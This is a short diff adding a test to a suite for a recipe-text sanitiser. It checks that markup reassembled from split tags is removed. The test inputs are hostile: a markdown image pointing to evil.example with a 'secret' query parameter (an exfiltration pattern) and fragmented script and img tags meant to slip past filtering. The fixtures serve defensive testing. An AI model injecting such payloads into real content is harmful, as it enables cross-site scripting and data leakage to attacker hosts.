@@ -118,6 +118,12 @@ describe('sanitizeRecipeText', () => {
 	it('removes reference-style images and link definitions', () => {
 		expect(sanitizeRecipeText('Look ![x][1]\n[1]: https://evil.example/a.png')).toBe('Look');
 	});
+
+	it('removes markup rebuilt from the pieces around what it removed', () => {
+		expect(sanitizeRecipeText('Risk !<b>[x]<i>(https://evil.example/?q=secret)')).toBe('Risk');
+		expect(sanitizeRecipeText('<<b>script>alert(1)<</b>/script>')).toBe('alert(1)');
+		expect(sanitizeRecipeText('<<b>img src="https://evil.example/a.png">')).toBe('');
+	});
 });
 
 describe('processRecipeElement', () => {
